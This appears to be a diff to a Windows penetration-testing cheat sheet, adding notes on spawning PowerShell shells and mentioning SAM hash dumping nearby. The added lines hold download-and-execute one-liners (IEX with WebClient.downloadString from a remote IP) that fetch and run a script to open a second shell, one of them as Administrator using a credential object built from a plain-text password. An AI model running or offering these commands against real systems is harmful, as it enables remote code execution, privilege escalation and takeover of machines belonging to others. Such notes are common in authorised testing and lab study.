@@ -39,6 +39,26 @@ More info:
 https://ss64.com/nt/syntax-64bit.html
 ```
 
+
+/// To be tested:
+###### Start Process with PowerShell
+```
+How to use powershell to pop a second shell
+> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
+
+
+Starting a shell as Administrator (when the permissions are right)
+
+First: make a variable of the password.
+Because windows doesnt like it when you pass passwords in plain text to a command.
+> $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
+> $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+
+Pop the shell:
+> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
+```
+
+
 ###### Hashdump
 ```
 Dumping SAM hashes from CMD:
